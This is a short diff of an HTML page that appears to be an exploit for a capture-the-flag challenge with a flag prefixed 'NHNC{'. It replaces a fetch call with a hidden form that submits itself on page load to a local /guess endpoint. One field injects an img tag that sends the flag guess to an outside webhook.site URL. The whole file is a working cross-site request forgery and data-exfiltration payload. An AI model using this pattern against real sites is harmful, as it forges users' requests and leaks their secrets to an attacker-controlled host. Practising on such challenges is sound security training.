@@ -1,16 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
+  <form action="http://127.0.0.1:5000/guess" method="POST">
+    <input type="hidden" name="guess" value="NHNC{">
+    <input type="hidden" name="note" value='<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{">'>
+    <input type="submit" value="Submit">
+  </form>
   <script>
-    fetch('/guess', {
-    method: 'POST',
-    credentials: 'include',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      guess: 'NHNC{',
-      note: '<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{">'
-    })
-  });
+    document.forms[0].submit();
   </script>
 </body>
 </html>
